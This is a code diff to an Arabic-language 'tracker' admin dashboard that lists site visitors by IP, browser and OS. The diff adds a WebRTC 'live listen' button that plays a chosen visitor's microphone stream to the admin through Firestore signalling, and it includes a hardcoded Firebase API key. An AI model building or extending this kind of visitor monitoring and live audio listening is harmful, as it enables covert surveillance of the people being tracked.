@@ -256,24 +256,32 @@
     .session-device-icon { font-size: 1rem; }
 
     .session-delete {
-      width: 26px;
-      height: 26px;
+      min-height: 28px;
       border: 1px solid rgba(239,68,68,0.28);
       background: rgba(239,68,68,0.1);
       color: #fca5a5;
       border-radius: 8px;
+      padding: 4px 10px;
       cursor: pointer;
-      flex-shrink: 0;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 0.8rem;
+      gap: 5px;
+      font-family: inherit;
+      font-size: 0.74rem;
+      font-weight: 700;
       transition: background 0.2s, color 0.2s;
     }
 
     .session-delete:hover {
       background: rgba(239,68,68,0.22);
       color: #fecaca;
+    }
+
+    .session-card-actions {
+      display: flex;
+      justify-content: flex-end;
+      margin-top: 8px;
     }
 
     .icon-btn.danger {
@@ -283,6 +291,15 @@
     }
 
     .icon-btn.danger:hover { background: rgba(239,68,68,0.18); }
+
+    .icon-btn.voice {
+      border-color: rgba(20,184,166,0.38);
+      color: #99f6e4;
+      background: rgba(20,184,166,0.08);
+    }
+
+    .icon-btn.voice:hover,
+    .icon-btn.voice.live { background: rgba(20,184,166,0.2); }
 
     .session-meta {
       display: flex;
@@ -560,6 +577,7 @@
             <div class="events-subtitle" id="eventsSubtitle"></div>
           </div>
           <div class="events-actions">
+            <button class="icon-btn voice" id="voiceListenBtn" onclick="toggleAdminVoice()">🎧 استماع مباشر</button>
             <button class="icon-btn danger" onclick="deleteSession(event)">🗑 حذف الجلسة</button>
             <button class="icon-btn" onclick="clearSelection()">✕ إغلاق</button>
           </div>
@@ -584,6 +602,7 @@
 </div>
 
 <div class="notif" id="notif"></div>
+<audio id="liveAudio" autoplay playsinline></audio>
 
 <script type="module">
   import { initializeApp }          from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
@@ -591,7 +610,9 @@
            getDoc, collection,
            query, orderBy,
            onSnapshot,
-           deleteDoc }              from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+           deleteDoc,
+           addDoc, setDoc,
+           updateDoc }              from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
   const firebaseConfig = {
     apiKey: "AIzaSyBKYhw1mfkNWVvWI9GZrKQsRsgCXbtflUI",
@@ -606,12 +627,22 @@
   const db  = getFirestore(app);
 
   // ── State ────────────────────────────────────────────────
-  let soundEnabled  = true;
+  const SOUND_PREF_KEY = 'tracker_sound_enabled';
+  let soundEnabled  = localStorage.getItem(SOUND_PREF_KEY) !== '0';
+  let soundUnlocked = localStorage.getItem(SOUND_PREF_KEY) === '1';
   let selectedSid   = null;
   let eventsUnsub   = null;
   let sessionsUnsub = null;
   let knownSids     = new Set();
   let sessions      = {};   // sid → data
+
+  const RTC_CONFIG = {
+    iceServers: [{ urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302'] }]
+  };
+
+  let adminVoicePc = null;
+  let adminVoiceSid = null;
+  let adminVoiceUnsubs = [];
 
   const EVENT_ICONS = {
     page_load:          '🌐',
@@ -700,6 +731,9 @@
     if (!soundEnabled) {
       btn.textContent = '🔕 صامت';
       btn.classList.add('muted');
+    } else if (soundUnlocked && (!audioCtx || audioCtx.state !== 'running')) {
+      btn.textContent = '🔔 الصوت محفوظ — انقر لإعادة التفعيل';
+      btn.classList.remove('muted');
     } else if (!audioCtx || audioCtx.state !== 'running') {
       btn.textContent = '🔔 انقر لتفعيل الصوت';
       btn.classList.remove('muted');
@@ -713,12 +747,18 @@
     if (!soundEnabled) {
       soundEnabled = true;
       await unlockAudio();
+      soundUnlocked = !!audioCtx && audioCtx.state === 'running';
+      localStorage.setItem(SOUND_PREF_KEY, '1');
       playBeep();
     } else if (!audioCtx || audioCtx.state !== 'running') {
       await unlockAudio();
+      soundUnlocked = !!audioCtx && audioCtx.state === 'running';
+      localStorage.setItem(SOUND_PREF_KEY, '1');
       playBeep();
     } else {
       soundEnabled = !soundEnabled;
+      soundUnlocked = soundEnabled;
+      localStorage.setItem(SOUND_PREF_KEY, soundEnabled ? '1' : '0');
     }
     updateSoundBtn();
   };
@@ -846,7 +886,6 @@
             <div class="status-dot ${status}"></div>
             <div class="session-ip">${d.ip || '—'}</div>
             <div class="session-device-icon">${icon}</div>
-            <button class="session-delete" title="حذف الجلسة" onclick="deleteSession(event, '${sid}')">🗑</button>
           </div>
           <div class="session-meta">
             <span>${d.browser || '?'} / ${d.os || '?'}</span>
@@ -854,6 +893,9 @@
           </div>
           ${field}
           ${action}
+          <div class="session-card-actions">
+            <button class="session-delete" type="button" title="حذف الجلسة" onclick="deleteSession(event, '${sid}')">🗑 حذف الجلسة</button>
+          </div>
         </div>`;
     }).join('');
   }
@@ -863,14 +905,17 @@
     selectedSid = sid;
     renderSessions();
     loadEvents(sid);
+    updateVoiceListenBtn();
   };
 
   window.clearSelection = () => {
+    if (adminVoicePc && adminVoiceSid === selectedSid) stopAdminVoice('selection_closed');
     selectedSid = null;
     if (eventsUnsub) { eventsUnsub(); eventsUnsub = null; }
     document.getElementById('eventsView').style.display  = 'none';
     document.getElementById('noSession').style.display   = 'flex';
     renderSessions();
+    updateVoiceListenBtn();
   };
 
   window.deleteSession = async (e, sid = selectedSid) => {
@@ -893,6 +938,115 @@
       showNotif('تم حذف الجلسة');
     } catch (err) {
       showNotif('تعذر حذف الجلسة — تحقق من صلاحيات Firebase');
+    }
+  };
+
+  function updateVoiceListenBtn() {
+    const btn = document.getElementById('voiceListenBtn');
+    if (!btn) return;
+    if (adminVoicePc && adminVoiceSid === selectedSid) {
+      btn.textContent = '🔴 إنهاء الاستماع';
+      btn.classList.add('live');
+    } else {
+      btn.textContent = '🎧 استماع مباشر';
+      btn.classList.remove('live');
+    }
+  }
+
+  function stopAdminVoice(status = 'admin_stopped') {
+    adminVoiceUnsubs.forEach(unsub => {
+      try { unsub(); } catch (_) {}
+    });
+    adminVoiceUnsubs = [];
+    if (adminVoicePc) {
+      try { adminVoicePc.close(); } catch (_) {}
+      adminVoicePc = null;
+    }
+    const audio = document.getElementById('liveAudio');
+    if (audio) audio.srcObject = null;
+    if (adminVoiceSid) {
+      updateDoc(doc(db, 'LiveAudio', adminVoiceSid), {
+        status,
+        updatedAt: new Date()
+      }).catch(() => {});
+    }
+    adminVoiceSid = null;
+    updateVoiceListenBtn();
+  }
+
+  window.toggleAdminVoice = async () => {
+    if (!selectedSid) return;
+    if (adminVoicePc && adminVoiceSid === selectedSid) {
+      stopAdminVoice();
+      showNotif('تم إنهاء الاستماع');
+      return;
+    }
+
+    stopAdminVoice('switched_session');
+    const sid = selectedSid;
+    const callRef = doc(db, 'LiveAudio', sid);
+    const callerCandidates = collection(db, 'LiveAudio', sid, 'callerCandidates');
+    const calleeCandidates = collection(db, 'LiveAudio', sid, 'calleeCandidates');
+
+    try {
+      const callSnap = await getDoc(callRef);
+      const callData = callSnap.data();
+      if (!callData?.offer) {
+        showNotif('لا يوجد بث صوتي مفتوح لهذه الجلسة');
+        return;
+      }
+
+      adminVoiceSid = sid;
+      adminVoicePc = new RTCPeerConnection(RTC_CONFIG);
+
+      adminVoicePc.ontrack = e => {
+        const audio = document.getElementById('liveAudio');
+        if (!audio) return;
+        audio.srcObject = e.streams[0];
+        audio.play().catch(() => showNotif('اضغط استماع مرة أخرى لتشغيل الصوت'));
+      };
+
+      adminVoicePc.onicecandidate = e => {
+        if (e.candidate) addDoc(calleeCandidates, e.candidate.toJSON()).catch(() => {});
+      };
+
+      adminVoicePc.onconnectionstatechange = () => {
+        if (['failed', 'disconnected', 'closed'].includes(adminVoicePc?.connectionState)) {
+          stopAdminVoice('disconnected');
+        }
+      };
+
+      await adminVoicePc.setRemoteDescription(new RTCSessionDescription(callData.offer));
+      const answer = await adminVoicePc.createAnswer();
+      await adminVoicePc.setLocalDescription(answer);
+
+      await setDoc(callRef, {
+        answer: { type: answer.type, sdp: answer.sdp },
+        status: 'connected',
+        adminConnectedAt: new Date()
+      }, { merge: true });
+
+      adminVoiceUnsubs.push(onSnapshot(callerCandidates, snap => {
+        snap.docChanges().forEach(change => {
+          if (change.type === 'added' && adminVoicePc) {
+            adminVoicePc.addIceCandidate(new RTCIceCandidate(change.doc.data())).catch(() => {});
+          }
+        });
+      }));
+
+      adminVoiceUnsubs.push(onSnapshot(callRef, snap => {
+        const data = snap.data();
+        if (['ended', 'ended_by_visitor', 'permission_denied'].includes(data?.status)) {
+          stopAdminVoice(data.status);
+          showNotif('انتهى البث الصوتي من المستخدم');
+        }
+      }));
+
+      updateVoiceListenBtn();
+      showNotif('جارٍ الاتصال بالبث الصوتي...');
+    } catch (err) {
+      stopAdminVoice('admin_error');
+      showNotif('تعذر تشغيل البث الصوتي');
     }
   };
 
